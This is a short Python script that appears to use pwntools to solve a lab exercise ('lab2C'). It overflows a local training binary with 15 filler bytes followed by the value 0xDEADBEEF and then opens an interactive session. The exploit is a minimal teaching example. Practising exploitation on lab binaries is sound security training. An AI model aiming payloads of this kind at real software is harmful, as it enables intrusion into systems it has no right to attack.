#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab2C')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def solve():

    offset = 15

    payload = b"A"*offset + p32(0xDEADBEEF)

    io = process([exe.path, payload])

    io.interactive()


def main():
    
    solve()
    

if __name__ == '__main__':
    main()

